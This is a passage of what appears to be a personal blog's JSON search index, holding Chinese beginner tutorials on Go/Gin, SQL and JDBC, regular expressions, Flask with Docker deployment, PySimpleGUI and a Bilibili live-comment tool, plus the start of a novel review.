\u0026amp;\\int{csc\\ x}dx=ln|csc\\ x-cot\\ x|+C\\\\ \u0026amp;\\int{sec\\ x}dx=ln|sec\\ x+tan\\ x|+C\\\\ \u0026amp;\\int{sec^2\\ x}dx=tan\\ x+C\\\\ \u0026amp;\\int{csc^2\\ x}dx=-cot\\ x+C\\\\ \u0026amp;\\int{sec\\ x*tan\\","title":"高等数学（上） 不定积分 总结"},{"content":"自带的net/http库的使用 http库提供了HTTP服务的用户端和服务端的实现。\n官方文档\nGo语言基础之net/http | 李文周的博客 (liwenzhou.com)\n示例代码\n监听本地端口，在浏览器输出Hello World字符串。\n1 2 3 4 5 6 7 8 func sayHello(w http.ResponseWriter,r *http.Request){ //ResponseWriter为服务端返回的内容 fmt.Fprintln(w, \u0026#34;Hello World!\u0026#34;) } func main(){ http.HandleFunc(\u0026#34;/\u0026#34;,sayHello) http.ListenAndServe(\u0026#34;:8080\u0026#34;,nil) } Gin框架 简介 Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。\n官方中文文档\nGin框架介绍及使用 | 李文周的博客 (liwenzhou.com)\n特性\nGin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识 使用Gin框架返回一个json文件\n1 2 3 4 5 6 7 8 9 10 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \u0026#34;message\u0026#34;:\u0026#34;HelloWorld\u0026#34;, }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\u0026#34;/\u0026#34;,sayHello)//处理向\u0026#34;/\u0026#34;目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数：\n1 2 3 4 5 r.GET(\u0026#34;/\u0026#34;,func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \u0026#34;message\u0026#34;:\u0026#34;HelloWorld\u0026#34;, }) }) 使用Gin框架返回一个html文件\n1 2 3 4 5 6 7 8 func main(){ r:=gin.Default() r.LoadHTMLFiles(\u0026#34;hello.html\u0026#34;)//解析模板 r.GET(\u0026#34;/\u0026#34;,func(c *gin.Context){ c.HTML(http.StatusOK,\u0026#34;hello.html\u0026#34;,gin.H{}) }) r.Run() } 模板渲染 template package - html/template - pkg.go.dev\nGo语言标准库之http/template | 李文周的博客 (liwenzhou.com)\n一个简单示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\u0026#34;./hello.tmpl\u0026#34;) // 渲染模板 u1 := User{ // u1.Name Name: \u0026#34;zeroy\u0026#34;, Gender: \u0026#34;男\u0026#34;, Age: 18, } m1 := map[string]interface{}{ \u0026#34;name\u0026#34;: \u0026#34;zeroy\u0026#34;, \u0026#34;gender\u0026#34;: \u0026#34;男\u0026#34;, \u0026#34;age\u0026#34;: 18, } hobbyList := []string{ \u0026#34;乒乓球\u0026#34;, \u0026#34;网球\u0026#34;, \u0026#34;羽毛球\u0026#34;, } t.Execute(w, map[string]interface{}{ \u0026#34;u1\u0026#34;: u1, \u0026#34;m1\u0026#34;: m1, \u0026#34;hobby\u0026#34;: hobbyList, }) } func main() { http.HandleFunc(\u0026#34;/\u0026#34;, sayHello) http.ListenAndServe(\u0026#34;:9000\u0026#34;, nil) } 在Gin框架中渲染模板\n1 2 3 4 5 6 7 8 9 10 11 func main(){ r:=gin.Default() r.LoadHTMLFiles(\u0026#34;hello.tmpl\u0026#34;)//加载模板 r.GET(\u0026#34;/\u0026#34;,func(c *gin.Context){ c.HTML(http.StatusOK,\u0026#34;hello.tmpl\u0026#34;,gin.H{//向模板中传递参数 \u0026#34;name\u0026#34;: \u0026#34;zeroy\u0026#34;, \u0026#34;age\u0026#34;: 18, }) }) r.Run() } 模板文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;name: {{.name}}\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;age: {{.age}}\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。\nGin框架返回json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package main import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { r := gin.Default() r.GET(\u0026#34;/json\u0026#34;, func(c *gin.Context) { data := gin.H{\u0026#34;name\u0026#34;:\u0026#34;zeroy\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;hello world!\u0026#34;, \u0026#34;age\u0026#34;: 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\u0026#34;name\u0026#34;`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\u0026#34;/another_json\u0026#34;, func(c *gin.Context) { data := msg{ \u0026#34;zeroy\u0026#34;, \u0026#34;Hello golang!\u0026#34;, 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数 querystring参数即URL中?后的参数。\n1 2 username := c.DefaultQuery(\u0026#34;username\u0026#34;, \u0026#34;zeroy\u0026#34;)//若查询不到username则默认值为zeroy address := c.Query(\u0026#34;address\u0026#34;) 例程：A+B Problem web版\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;strconv\u0026#34; ) func main() { r:=gin.Default() r.GET(\u0026#34;/\u0026#34;,func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\u0026#34;a\u0026#34;)) b,_:=strconv.Atoi(c.Query(\u0026#34;b\u0026#34;)) c.JSON(200,gin.H{\u0026#34;sum\u0026#34;:a+b,}) }) r.Run() } 获取form参数 1 2 username := c.PostForm(\u0026#34;username\u0026#34;) address := c.PostForm(\u0026#34;address\u0026#34;) PostForm方法可以获取Post请求提交的参数。\n获取path参数 例程：A+B Problem web版（使用path参数传参）\n1 2 3 4 5 6 7 8 9 func main() { r:=gin.Default() r.GET(\u0026#34;/:a/:b\u0026#34;,func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\u0026#34;a\u0026#34;)) b,_:=strconv.Atoi(c.Param(\u0026#34;b\u0026#34;)) c.JSON(200,gin.H{\u0026#34;sum\u0026#34;:a+b,}) }) r.Run() } 参数绑定 ShouldBind方法可以自动化绑定参数到某个struct中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 type People struct{ Name string `form:\u0026#34;name\u0026#34;`//设定别名，方便传参 Age int\t`form:\u0026#34;age\u0026#34;` BirthDay string `form:\u0026#34;birthday\u0026#34;` } func main() { r:=gin.Default() r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026amp;zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \u0026#34;name\u0026#34;:zeroy.Name, \u0026#34;age\u0026#34;:zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\u0026#34;error\u0026#34;: err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 type Node struct{ X int `form:\u0026#34;x\u0026#34;` Y int `form:\u0026#34;y\u0026#34;` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026amp;tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \u0026#34;sum\u0026#34;:tmp.sum(), }) } else { c.JSON(http.StatusBadRequest, gin.H{\u0026#34;error\u0026#34;: err.Error()}) } }) r.Run() } 文件上传 1 2 3 4 c.FormFile(\u0026#34;\u0026#34;) dst := fmt.Sprintf(\u0026#34;./%s\u0026#34;, file.Filename) // 上传文件到指定的目录 c.SaveUploadedFile(file, dst) 1 2 form, _ := c.MultipartForm()//多个文件上传 files := form.File[\u0026#34;file\u0026#34;] 总结 掌握了Gin框架的基本操作，我们便有能力搭建一个最最基本的web服务，处理来自用户端的请求。\n但是如果要搭建一个真正实用的服务器后端，还需要与本地的数据库进行交互（database/sql，GORM），进行复杂的鉴权操作。\n之后可能会看看数据库交互和一些中间件，实现鉴权和与本地数据库交互。\n","permalink":"http://localhost:1313/articles/Golang-web1/","summary":"自带的net/http库的使用 http库提供了HTTP服务的用户端和服务端的实现。 官方文档 Go语言基础之net/http | 李文周的博客 (liwenzhou.com) 示例","title":"Golang|Gin Web development for Beginners"},{"content":"数据库基础 增 新建数据库\n1 CREATE DATABASE {{name}} 新建数据表\n1 2 3 4 5 6 7 8 9 10 11 12 CREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束\n建表时添加\n1 CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加\n1 alter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素\n1 2 3 4 5 EXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,\u0026#39;zeroy\u0026#39;,\u0026#39;2003-4-10\u0026#39;,100) , (2,\u0026#39;admin\u0026#39;,\u0026#39;2003-4-10\u0026#39;,99) 查 1 2 3 4 5 6 7 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 1 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务 事务能实现多条命令捆绑，一旦失败，会回滚所有操作。\n1 2 3 4 5 6 -- 开启事务 BEGIN; -- 回滚事务 ROLLBACK; -- 提交事务 COMMIT; 数据库设计 一对多\n如博客系统一个用户对应多篇文章，需要在文章表处引一条外键连向数据表。\n多对多\n如购物系统中一个商品对应多个订单，一个订单也被多个商品所共有。\n实现方式：新建一张表引出两条外键分别连向商品表和订单表的主键，这张数据表的一行代表一件商品与一张订单之间的关系。\n一对一\n用于表拆分，提升常用信息的访问速度。\nJDBC入门 简介 Java数据库连接，（Java Database Connectivity，简称JDBC）是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC也是Sun Microsystems的商标[1]。JDBC是面向关系型数据库的。\n步骤 注册驱动\n1 Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;) 获取连接对象\n1 Connection conn= DriverManager.getConnection(\u0026#34;jdbc:mysql://127.0.0.1:3306/{{数据库名}}\u0026#34;,\u0026#34;username\u0026#34;,\u0026#34;password\u0026#34;); 获取连接状态\n有两种方式，后者可以预处理sql模板。\n1 2 3 String sql=\u0026#34;SELECT * FROM customers\u0026#34;;//查询sql语句 Statement stmt=conn.createStatement(); PreparedStatement pstmt=conn.prepareStatement(sql); 发送查询请求\n1 2 ResultSet rs=stmt.executeQuery(sql); Resultset rs=pstmt.executeQuery(); 将查询请求封装为对象储存\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 while(rs.next()) { Customer customer = new Customer(); int customerId = rs.getInt(\u0026#34;customer_id\u0026#34;); String firstName = rs.getString(\u0026#34;firstName\u0026#34;); String lastName = rs.getString(\u0026#34;lastName\u0026#34;); Date birthDate = rs.getDate(\u0026#34;birthDate\u0026#34;); int points = rs.getInt(\u0026#34;points\u0026#34;); customer.setId(customerId); customer.setBirthDate(birthDate); customer.setFirstName(firstName); customer.setLastName(lastName); customer.setPoints(points); customers.add(customer); } 使用PreparedStatement模板查询或修改数据\n使用？作为占位符，在后续代码中再进行数据填充。\n1 2 3 4 5 6 7 8 9 String sql=\u0026#34;insert customers(first_name,last_name,birth_date,points,address,city,state) value(?,?,?,?,?,?,?);\u0026#34;; PreparedStatement pstmt=conn.prepareStatement(sql); pstmt.setString(1,firstName); pstmt.setString(2,lastName); pstmt.setDate(3,birthDate); pstmt.setInt(4,points); pstmt.setString(5,addtress); pstmt.setString(6,city); pstmt.setString(7,state); 这样做的优点是可以预防SQL注入。\nPreparedStatement对象会对输入的字符串做转义处理，可以防止原理为简单字符串拼接生效的SQL注入。（当然还有模板注入防不了）\nDruid数据库连接池的简单使用 简介 在软件工程中，连接池（英语：connection pool）是维护的数据库连接的缓存，以便在将来需要对数据库发出请求时可以重用连接。 连接池用于提高在数据库上执行命令的性能。为每个用户打开和维护数据库连接，尤其是对动态数据库驱动的网站应用程序发出的请求，既昂贵又浪费资源。在连接池中，创建连接之后，将连接放在池中并再次使用，这样就不必创建新的连接。如果所有连接都正在使用，则创建一个新连接并将其添加到池中。连接池还减少了用户必须等待创建与数据库的连接的时间。\nDruid是由阿里巴巴开发的数据库连接池。\n配置文件的书写 1 2 3 4 5 6 7 8 9 10 driverClassName=com.mysql.jdbc.Driver url={{数据库地址}} username={{your username}} password={{your password}} # 默认连接数 initialSize=5 # 最大连接数 maxActive=10 # 最长等待时间 maxWait=3000 从数据库连接池中获取连接 1 2 3 4 Properties prop=new Properties(); prop.load(new FileInputStream(\u0026#34;src/druid.properties\u0026#34;));//填写druid配置文件的路径 DataSource dataSource= DruidDataSourceFactory.createDataSource(prop); Connection conn=dataSource.getConnection(); ","permalink":"http://localhost:1313/articles/database-for-beginner/","summary":"数据库基础 增 新建数据库 1 CREATE DATABASE {{name}} 新建数据表 1 2 3 4 5 6 7 8 9 10 11 12 CREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL,","title":"数据库基础|JDBC入门|Druid连接池的简单配置"},{"content":"简介 正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。\n许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。\n语法总结 需要转义的特殊字符：\n1 .[{()\\^$|?*+ 就像在其它任何语言中那样，转义需要在符号前加上\\。\n匹配规则：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 . - 除了新行外的任何字符 \\d - 数字 (0-9) \\D - 非数字 (0-9) \\w - 单词字母 (a-z, A-Z, 0-9, _) \\W - 非单词字母 \\s - 空字符 (space, tab, newline) \\S - 非空字符 (space, tab, newline) \\b - 单词边界 \\B - 非单词边界 ^ - 字符串开头（默认将一行看作一整个字符串） $ - 字符串结尾（默认将一行看作一整个字符串） [] - 匹配字符集 [^ ] - 匹配除了字符集外的字符 | - 或者 ( ) - Group Quantifiers: * - 0 or More + - 1 or More ? - 0 or One {3} - Exact Number {3,4} - Range of Numbers (Minimum, Maximum) [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 一些例子：\n匹配人名：\n1 2 3 4 5 6 7 Mr. Schafer Mr Smith Ms Davis Mrs. Robinson Mr. T M(r|s|rs)\\.?\\s[A-Z]\\w* 匹配两种格式的电话号码：\n1 2 3 4 5 123.555.1234 800-555-4321 900-555-4321 \\d{3}[.-]\\d{3}[.-]\\d{4} 匹配三种格式的电子邮件：\n1 2 3 4 5 CoreyMSchafer@gmail.com corey.schafer@university.edu corey-321-schafer@my-work.net [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 按Group引用 提取文件中的url，并截取出其中的顶级域名：\n1 2 3 4 5 6 7 8 9 10 11 12 https://www.google.com http://coreyms.com https://youtube.com https://www.nasa.gov 匹配https?://(www\\.)?(\\w+)(\\.\\w+) 引用：$2$3 结果： google.com coreyms.com youtube.com nasa.gov ","permalink":"http://localhost:1313/articles/regular-expression/","summary":"简介 正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、","title":"正则表达式 For Beginner"},{"content":"功能描述 支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据 基本结构 Demo 项目地址\n技术路线 后端：python-Flask\n前端：BootStrap\n踩过的坑 程序开始时数据库需要已经初始化完毕db.create_all() 使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为\u0026rsquo;None\u0026rsquo;） Docker应用部署细节 Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。\n使用阿里云作为Docker Hub。\n1 2 3 4 5 6 7 8 #注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。\n1 docker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","permalink":"http://localhost:1313/tallyapp1/","summary":"功能描述 支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据 基本结","title":"Flask学习1 TallyApp beta 0.9"},{"content":"前言 python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。\n于是我找到了PySimpleGUI这个库。\nA introduction to PySimpleGUI\n这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。\n安装 1 pip install PySimpleGUI 在文件开头加上库引用：\n1 import PySimpleGUI as sg 元素 PySimpleGUI有着丰富的控件支持。\n文本框（Text） 1 sg.Text(\u0026#39;文本框\u0026#39;,size=(12,1),key=\u0026#39;output\u0026#39;) '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。\n输入框（Input） 1 sg.Input(key=\u0026#39;input\u0026#39;) 按钮（Button） 1 sg.Button(\u0026#39;Go\u0026#39;) 'Go'为按钮的名字。也可以另外设置key值。\n下拉框（Comobo） 1 [ sg.Text(\u0026#34;City\u0026#34;, size = (20, 1)), sg.Combo((\u0026#34;北京\u0026#34;, \u0026#34;上海\u0026#34;, \u0026#34;深圳\u0026#34;), size=(10, 1), default_value=\u0026#34;上海\u0026#34;, key = \u0026#34;-CITY-\u0026#34;)] 弹窗（Popup） 1 2 3 sg.Popup(\u0026#39;弹窗1\u0026#39;,\u0026#39;This is the first one\u0026#39;) sg.Popup(\u0026#39;弹窗2\u0026#39;,\u0026#39;This is the second one\u0026#39;) sg.Popup(\u0026#39;弹窗3\u0026#39;,\u0026#39;This is the third one\u0026#39;) 弹出一个窗口包含标题和内容。\n选择文件（FileBrowse） 1 sg.FileBrowse() 选择文件路径（FolderBrowse） 1 sg.InputText(size=(15,1)),sg.FolderBrowse() 多行列表文本（ListBox） 1 2 3 4 list = [1，2，3] layout = [ [sg.Listbox(values=list,size=(20,12),key=\u0026#39;LIST\u0026#39;,enable_events=True)] ] 多选框（Checkbox） 1 sg.Checkbox(\u0026#39;多选框\u0026#39;,default=True) 单选框（Radio） 1 2 # RADIO1 必有 sg.Radio(\u0026#39;单选框\u0026#39;,\u0026#39;RADIO1\u0026#39;,default=True) 大文本框（Multiline） 1 sg.Multiline(default_text=\u0026#39;hello\u0026#39;) 下拉列表框（InputCombo） 1 sg.InputCombo([\u0026#39;box_1\u0026#39;,\u0026#39;box_2\u0026#39;],size=(20,3)) 拖动按钮（Slider） 1 2 3 4 5 sg.Slider(range=(1,100),orientation=\u0026#39;h\u0026#39;,size=(34,20),default_value=85) # (range=(1, 100)：数值范围 # orientation=拖动方向 ‘h’ :横向 ‘v’：竖向 # size=(34, 20)：大小 # default_value=85默认值 下拉选项（InputOptionMenu） 1 sg.InputOptionMenu(\u0026#39;Menu_1\u0026#39;,\u0026#39;Menu_2\u0026#39;,size=(20,2)) 菜单（Menu） 1 sg.Menu(menu_def, tearoff=True) 控件（Column） 1 sg.Column(column1, background_color=\u0026#39;\u0026#39;) 进度条（ProgressBar） 1 2 3 sg.ProgressBar(10,orientation=\u0026#39;h\u0026#39;,size=()) # 10：进度条长度 # orientation=‘h’/v 方向 调试窗口 1 sg.Print(\u0026#39;内容\u0026#39;, text_color=\u0026#39;\u0026#39;, background_color=\u0026#39;\u0026#39;, font=\u0026#39;\u0026#39;) 自带按钮 1 2 3 4 5 sg.OK(), sg.Cancel(),sg.Submit()等 #这三个按钮是自带的，默认的，不需要单独定义其作用 当然，也可以单独设置 sg.Button(\u0026#39;Ok\u0026#39;), sg.Button(\u0026#39;Cancel\u0026#39;) 自带按钮 sg.FolderBrowse()=sg.FileBrowse(), sg.Submit(), sg.Cancel() 构建窗口 使用PySimpleGUI构建一个窗口十分简单，你需要使用一个list描述元素之间的位置关系，然后系统便会自动生成布局。\n以我上一篇博文Bilibili直播弹幕收发小程序 | zeroy\u0026rsquo;s blog中的GUI界面为例：\n1 2 3 4 5 6 7 sg.theme(\u0026#39;DarkAmber\u0026#39;)#选择主题 layout = [ [sg.Listbox(\u0026#39;\u0026#39;,size=(75,20),key=\u0026#39;-OUT-\u0026#39;)], [sg.Text(\u0026#39;发送弹幕: \u0026#39;, size=(8, 1)),sg.InputText(\u0026#39;\u0026#39;,key=\u0026#39;-input-\u0026#39;),sg.Button(\u0026#34;Go\u0026#34;),sg.Button(\u0026#34;Exit\u0026#34;),sg.Button(\u0026#34;Help\u0026#34;)], [sg.Text(\u0026#39;\u0026#39;,key=\u0026#39;-error-\u0026#39;)] ]#使用list描述元素之间的相对关系 window=sg.Window(\u0026#34;Bilibili弹幕收发程序\u0026#34;,layout)生成窗口 怎么样，是不是很方便呢？\n窗口中内建了多种方法，用于描述窗口事件。\n1 2 3 window.close()#关闭窗口 window.read()#读取窗口内容 window[\u0026#39;key名\u0026#39;].update(\u0026#39;需要更新的内容\u0026#39;) 掌握了这些基本的知识，构建一个简单的GUI程序应该没什么难的了。\n上面提到的收发弹幕的程序的GUI部分完整代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import PySimpleGUI as sg import send import receive sg.theme(\u0026#39;DarkAmber\u0026#39;) layout = [ [sg.Listbox(\u0026#39;\u0026#39;,size=(75,20),key=\u0026#39;-OUT-\u0026#39;)], [sg.Text(\u0026#39;发送弹幕: \u0026#39;, size=(8, 1)),sg.InputText(\u0026#39;\u0026#39;,key=\u0026#39;-input-\u0026#39;),sg.Button(\u0026#34;Go\u0026#34;),sg.Button(\u0026#34;Exit\u0026#34;),sg.Button(\u0026#34;Help\u0026#34;)], [sg.Text(\u0026#39;\u0026#39;,key=\u0026#39;-error-\u0026#39;)] ] window=sg.Window(\u0026#34;Bilibili弹幕收发程序\u0026#34;,layout) while True:#开启窗口事件 event,values=window.read(timeout=3)#为输入框设定超时 try: window[\u0026#39;-OUT-\u0026#39;].update(receive.Receive())#更新输出框 except: sg.popup(\u0026#39;error: \u0026#39;,\u0026#39;请先配置好同一目录下的config.json文件\u0026#39;)#异常信息处理 break if event in (None,\u0026#39;Exit\u0026#39;):#按到了退出 break if event==\u0026#39;Go\u0026#39;:#发送弹幕 window[\u0026#39;-error-\u0026#39;].update(send.Send(values[\u0026#39;-input-\u0026#39;])) window[\u0026#39;-input-\u0026#39;].update(\u0026#34;\u0026#34;) if event==\u0026#39;Help\u0026#39;:#帮助页面 sg.popup(\u0026#39;帮助: \u0026#39;,\u0026#39;请先配置好同一目录下的config.json文件\u0026#39;) window.close() 更多的例子以及更高阶的应用指路：官方代码库\n总结 这个东西过于简洁，适合完全不会写GUI的程序员应急。\n","permalink":"http://localhost:1313/articles/PySimpleGUI/","summary":"前言 python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界","title":"使用PySimpleGUI库构建简单的图形界面"},{"content":"项目地址\n需求分析 在Linux下直播看不到弹幕，无法与观众互动。\n实现过程 第一阶段 问题可拆分为收与发。\n可行性分析 B站有API能够返回一个直播间最近的10条弹幕，可以依赖这个API接收弹幕。\n抓包可知一次发送弹幕的行为即为一次POST请求，可以使用python脚本实现发送信息。\n分别编写发送和接收弹幕的程序。开两个终端使用。\n第二阶段 开两个终端切换较为麻烦，于是萌生了把两个程序整合成一个的想法，想实现类似网页的上方是弹幕下方是输入框的效果。\n可行性分析 弹幕的动态捕捉依赖间隔固定时间地获取最近10条弹幕，提取出新的弹幕，显示在终端上，但是如果整合进输入程序，输入方法会阻塞进程，如果一直不输入就没有办法获取新的弹幕，所以需要为输入设定超时。\n查阅资料得知，为输入方法设定超时需要使用多线程，或者异步异常信息处理，刚学py，不会这些。。。\n查阅英文资料和pypi得知，python有个inputimeout库可以处理超时输入的问题，所以就整上了。\n但是在现在这一流程中，每次输入超时都需要清屏，这样每次更新弹幕的时候都会闪一下，体验非常不好。\n第三阶段 有没有办法实现一个terminal中分屏显示都个session呢？\n可行性分析 结合我个人的Linux使用经验，可以使用tmux这个工具实现分屏操作，所以第二阶段的工作就白做了。。。\n最终效果 不足与提升空间 冷启动时需要较多的步骤，不够优雅。\n未来可以尝试使用GUI框架封装代码，实现一个输出框一个输入框收发代码。\n1/25 Update 采用PysimpleGUI这个最简单的GUI库封装了代码，现在很好用（）\n","permalink":"http://localhost:1313/articles/Bilibili-send-and-receive/","summary":"项目地址 需求分析 在Linux下直播看不到弹幕，无法与观众互动。 实现过程 第一阶段 问题可拆分为收与发。 可行性分析 B站有API能够返回一个直播间最","title":"Bilibili直播弹幕收发小程序"},{"content":"引言 我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。\n但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。\n故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。\n看看简介：\n《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。\n但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。\n这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。\n句子摘抄 